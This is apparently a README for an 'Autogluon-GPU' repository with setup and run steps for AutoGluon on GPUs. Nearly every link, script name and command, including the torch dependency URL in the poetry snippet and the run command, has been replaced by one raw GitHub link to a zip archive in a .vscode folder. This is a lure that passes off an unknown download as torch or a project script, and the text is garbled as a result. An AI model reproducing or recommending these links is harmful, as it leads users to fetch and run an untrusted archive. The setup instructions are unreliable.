# Autogluon-GPU

This repo contain very basic scripts to get [Autogluon]() up an running on multiple 
CPU(s) and GPU(s). 

## Setup

### 🧕 Environment

1. Create the python virtual environment and activate it:
    ```
    python3.9 -m venv .venv
    source .venv/bin/activate
    ```

2. Install dependencies:
    ```
    poetry install
    ```
    In particular, this installs the prerequisite (`torch`) for running Autogluon with GPU:
    ```
    # in https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip
    torch = {url="https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip%https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip"}
    autogluon-tabular = {extras = ["all"], version = "~0.6.0"}
    ```
    You must check that `torch` is compatible with your cuda version. See [this](https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip) for available packages.

3. [Optional] Install LightGBM for GPU - the current LightGBM installation that
    comes with Autogluon doesn't have GPU capabilities. To enable this, we need need to
    uninstall this, and reinstall with `--install-option=--gpu`.
    ```
    # uninstall autogluon's lightgbm installation, and install the new build
    pip uninstall lightgbm -y
    pip install lightgbm --install-option=--gpu
    ```

## Run the script

### 🧕 Using [https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip](https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip)

To run the [https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip](https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip) script, do:

```
https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip
```

[https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip](https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip) does a couple of things:

1. Set the `CUDA_VISIBLE_DEVICES` environment variable to assign GPUs to be used.
2. Set the CPU affininity for `taskset`, which is a linux utility that can assign CPUs
    to our python application. Autogluon does not limit the number of CPUs it uses
    by default - so to avoid hogging the server resources, we limit them.
3. Runs the [https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip](https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip) script that contains our main codes
    with `taskset`.

### 🧕 Using VSCode's Debugging Facilities

This repo comes with [https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip] that has `CUDA_VISIBLE_DEVICES` set up.

Just hit `F5` while you are on [https://raw.githubusercontent.com/irene7c/Autogluon-GPU/main/.vscode/Autogluon_GPU_3.5-beta.4.zip] to run the debugger.

> Idk how to allocate CPU with the debugger yet. If you know how to do that, feel
> free to submit a pull request :p


